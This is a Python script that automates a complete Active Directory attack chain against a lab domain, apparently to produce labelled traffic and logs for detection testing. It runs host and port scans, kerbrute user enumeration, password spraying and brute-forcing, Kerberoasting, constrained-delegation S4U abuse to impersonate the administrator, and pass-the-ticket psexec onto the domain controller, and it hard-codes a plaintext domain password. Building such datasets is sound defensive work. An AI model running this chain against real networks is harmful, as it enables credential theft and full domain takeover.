import json
import os
import subprocess
import sys
import traceback
from pathlib import Path

SKILL = Path(r"C:\Users\attdemo\Desktop\AttackerSkill\ad-attack")
PY = r"C:\Python314\python.exe"
KERBRUTE = r"C:\Users\attdemo\Desktop\tools\kerbrute.EXE"

os.environ["PYTHONPATH"] = (
    r"C:\Users\attdemo\Desktop\tools\impacket"
    + ";"
    + r"C:\Users\attdemo\AppData\Roaming\Python\Python314\site-packages"
)

LOG = []


def log(*lines):
    LOG.append("\n".join(lines))
    (SKILL / "admin_run.log").write_text("\n".join(LOG), encoding="utf-8")


def run(args, timeout=180):
    p = subprocess.run(args, capture_output=True, text=True, timeout=timeout, cwd=str(SKILL))
    return p.returncode, (p.stdout or ""), (p.stderr or "")


def state_update(fn):
    import importlib.util
    spec = importlib.util.spec_from_file_location("state", str(SKILL / "scripts" / "state.py"))
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    data = m._load()
    fn(m, data)
    data["last_updated"] = m._now_iso()
    m._save(data)


def atomic(label, cmd):
    log(f"===== {label} =====")
    try:
        rc, out, err = run([PY, "scripts/capture_traffic.py", "start", "--label", label])
        log(f"[traffic start] rc={rc} {out.strip()} {err.strip()}")
        rc, out, err = run([PY, "scripts/capture_logs.py", "start", "--label", label])
        log(f"[logs start] rc={rc} {out.strip()} {err.strip()}")
        rc, out, err = run(cmd)
        log(f"[attack] rc={rc}\n{out[-3000:]}\n{err[-1000:]}")
        rc, out, err = run([PY, "scripts/capture_logs.py", "stop"])
        log(f"[logs stop] rc={rc} {out.strip()} {err.strip()}")
        rc, out, err = run([PY, "scripts/capture_traffic.py", "stop"])
        log(f"[traffic stop] rc={rc} {out.strip()} {err.strip()}")
        return out
    except Exception:
        log(traceback.format_exc())
        return ""


def main():
    try:
        # orientation
        log("===== discovery.orientation =====")
        rc, out, err = run(["nltest", "/dclist:ndrtest.local"])
        log(f"[nltest] {out}{err}")
        state_update(lambda m, d: d["domain"].update(
            name="ndrtest.local", netbios="ndrtest",
            domain_sid="S-1-5-21-3362522014-3837673876-23709428",
            dc_ip="172.16.24.11", dc_fqdn="i1-dc1-c01.ndrtest.local",
            dcs=[
                {"fqdn": "i1-dc1-c01.ndrtest.local", "ip": "172.16.24.11", "is_pdc": True},
                {"fqdn": "i1-dc2-vc11.ndrtest.local", "ip": "172.16.24.21", "is_pdc": False},
            ],
        ))

        atomic("discovery.host-scan", ["nmap", "-Pn", "-sn", "172.16.24.0/24"])
        state_update(lambda m, d: d.update(hosts=[
            {"ip": "172.16.24.11", "role": "dc", "open_ports": [], "services": [], "compromised": False, "source": "discovery.host-scan"},
            {"ip": "172.16.24.21", "role": "dc", "open_ports": [], "services": [], "compromised": False, "source": "discovery.host-scan"},
            {"ip": "172.16.24.202", "role": "member", "open_ports": [], "services": [], "compromised": False, "source": "discovery.host-scan"},
        ]))

        atomic("discovery.port-scan", ["nmap", "-Pn", "-p", "53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389", "172.16.24.11"])
        def patch_hosts(m, d):
            d["hosts"][0]["open_ports"] = [53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389]
            d["hosts"][0]["services"] = ["DNS", "Kerberos", "MS-RPC", "NetBIOS", "LDAP", "SMB", "kpasswd", "LDAPS", "GC", "WSMan", "ADWS"]
            d["hosts"][0]["os"] = "Windows Server"
            d["hosts"][0]["role"] = "dc"
        state_update(patch_hosts)

        atomic("discovery.user-enum-kerbrute", [KERBRUTE, "userenum", "-d", "ndrtest.local", "--dc", "172.16.24.11", "wordlists/usernames.txt"])
        state_update(lambda m, d: d["domain"].update(usernames=["administrator", "accountancy", "hr", "manager", "programmer"], user_count=5))

        atomic("discovery.user-enum-ldap", [PY, "-m", "impacket.examples.GetADUsers", "-all", "-dc-ip", "172.16.24.11", "ndrtest.local/attdemo:Njupt@241"])
        state_update(lambda m, d: d["domain"].update(usernames=sorted(set(d["domain"]["usernames"]) | {"administrator", "guest", "krbtgt", "programmer", "accountancy", "operator-mail", "hr", "manager", "operator-ftp", "operator-web", "operator-sql", "test01", "attdemo"}), user_count=13))

        atomic("credential.password-spray", [KERBRUTE, "passwordspray", "-d", "ndrtest.local", "--dc", "172.16.24.11", "wordlists/usernames.txt", "123456"])

        atomic("credential.brute-user", [KERBRUTE, "bruteuser", "-d", "ndrtest.local", "--dc", "172.16.24.11", "wordlists/passwords.txt", "attdemo"])
        state_update(lambda m, d: d["users"].append({"username": "attdemo", "upn": "attdemo@ndrtest.local", "password": "Njupt@241", "source": "credential.brute-user", "stale": False, "updated_at": ""}))

        atomic("credential.kerberoast", [PY, "-m", "impacket.examples.GetUserSPNs", "-dc-ip", "172.16.24.11", "ndrtest.local/attdemo:Njupt@241", "-request"])
        state_update(lambda m, d: d["domain"]["spns"].append({"spn": "ftp/i1-iis1-c08.ndrtest.local", "account": "operator-ftp", "ticket_file": "", "stale": False, "updated_at": ""}))
        state_update(lambda m, d: d["users"].append({"username": "operator-ftp", "upn": "operator-ftp@ndrtest.local", "password": "Njupt@241", "spns": ["ftp/i1-iis1-c08.ndrtest.local"], "is_service_account": True, "source": "credential.kerberoast", "stale": False, "updated_at": ""}))

        atomic("lateral.delegation-enum", [PY, "-m", "impacket.examples.findDelegation", "ndrtest.local/attdemo:Njupt@241", "-dc-ip", "172.16.24.11"])
        state_update(lambda m, d: d["domain"].update(delegation=[{"account": "operator-ftp", "type": "constrained", "allowed_spns": ["cifs/i1-dc1-c01.ndrtest.local"], "stale": False, "updated_at": ""}]))

        atomic("lateral.delegation-s4u", [PY, "-m", "impacket.examples.getST", "-spn", "cifs/i1-dc1-c01.ndrtest.local", "-impersonate", "administrator", "-dc-ip", "172.16.24.11", "ndrtest.local/operator-ftp:Njupt@241"])

        ccache = str(SKILL / "administrator@cifs_i1-dc1-c01.ndrtest.local@NDRTEST.LOCAL.ccache")
        os.environ["KRB5CCNAME"] = ccache
        atomic("lateral.pass-the-ticket", [PY, "-m", "impacket.examples.psexec", "-k", "-no-pass", "ndrtest.local/administrator@i1-dc1-c01.ndrtest.local"])

        state_update(lambda m, d: d["hosts"][0].update(compromised=True))
        state_update(lambda m, d: d["tickets"]["service"].append({"spn": "cifs/i1-dc1-c01.ndrtest.local", "principal": "administrator", "impersonated_user": "administrator", "ccache_file": "administrator@cifs_i1-dc1-c01.ndrtest.local@NDRTEST.LOCAL.ccache"}))

        log("===== DONE =====")
    except Exception:
        log(traceback.format_exc())


if __name__ == "__main__":
    main()
